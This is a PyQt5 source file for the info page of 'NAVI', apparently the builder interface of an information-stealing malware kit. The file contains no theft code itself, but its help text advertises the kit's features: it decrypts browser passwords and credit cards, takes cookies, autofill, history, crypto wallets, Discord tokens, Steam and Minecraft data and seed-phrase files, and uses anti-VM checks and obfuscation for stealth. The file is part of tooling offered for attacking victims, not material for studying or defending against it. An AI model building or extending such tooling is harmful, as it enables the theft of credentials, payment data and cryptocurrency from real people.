from PyQt5.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QLabel, QFrame, QScrollArea
)
from PyQt5.QtCore import Qt
from PyQt5.QtGui import QFont, QPixmap
from ..styles import SCROLL_STYLE

class InfoPage(QWidget):
    def __init__(self):
        super().__init__()
        self.init_ui()

    def init_ui(self):
        main_layout = QVBoxLayout()
        main_layout.setContentsMargins(30, 30, 30, 30)
        
        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll.setStyleSheet(SCROLL_STYLE)
        
        content = QWidget()
        layout = QVBoxLayout()
        layout.setSpacing(20)
        
        logo_container = QHBoxLayout()
        logo_container.addStretch()
        logo = QLabel()
        pixmap = QPixmap("modules/logos/navi_logo.png")
        if not pixmap.isNull():
            logo.setPixmap(pixmap.scaled(150, 150, Qt.KeepAspectRatio, Qt.SmoothTransformation))
        else:
            logo.setText("N")
            logo.setFont(QFont("Segoe UI", 70, QFont.Bold))
            logo.setStyleSheet("color: #00a2ff;")
        logo_container.addWidget(logo)
        logo_container.addStretch()
        layout.addLayout(logo_container)
        
        creator = QLabel("NAVI")
        creator.setFont(QFont("Segoe UI", 18, QFont.Bold))
        creator.setStyleSheet("color: #00a2ff;")
        creator.setAlignment(Qt.AlignCenter)
        layout.addWidget(creator)
        
        line = QFrame()
        line.setFrameShape(QFrame.HLine)
        line.setStyleSheet("background-color: #2a2a3a; max-height: 1px;")
        layout.addWidget(line)
        
        help_text = """
        <b>Made with ♥️ by Decrypt</b> - Leave a star on github!<br>
        <br>
        <b>stealer:</b><br>
        • Saved Cookies  - gets cookies from ALL browsers <br>
        • Saved Passwords - decrypts passwords from ALL browsers<br>
        • Credit Cards - decrypts card numbers from Web Data, captures cardholder name and expiry<br>
        • Autofill Data - field names, values, usage counts<br>
        • Browsing History - URLs, titles, visit counts, timestamps<br>
        • Download History - file paths, source URLs, sizes, MIME types<br>
        • Crypto Wallets - scans 30+ wallet extension IDs and extracts local desktop wallets.<br>
        • Discord Tokens - gets discord tokens from both app and browser<br>
        • Steam - Steals steam data<br>
        • Minecraft - Steals launcher profiles<br>
        • Sensitive Files - Steals sensitive files like seedphrases etc.<br>
        <br>
        <b>technical info:</b><br>
        • Anti VM - Blocks virtual machines<br>
        • Debugging - Debug stub to find errors or for testing<br>
        • Obfuscation - Combine with obfuscator from the multitool for max stealth<br>
        """
        
        help_label = QLabel(help_text)
        help_label.setWordWrap(True)
        help_label.setStyleSheet("color: #aaa; font-size: 12px; line-height: 1.6;")
        help_label.setTextFormat(Qt.RichText)
        layout.addWidget(help_label)
        
        layout.addStretch()
        content.setLayout(layout)
        scroll.setWidget(content)
        
        main_layout.addWidget(scroll)
        self.setLayout(main_layout)
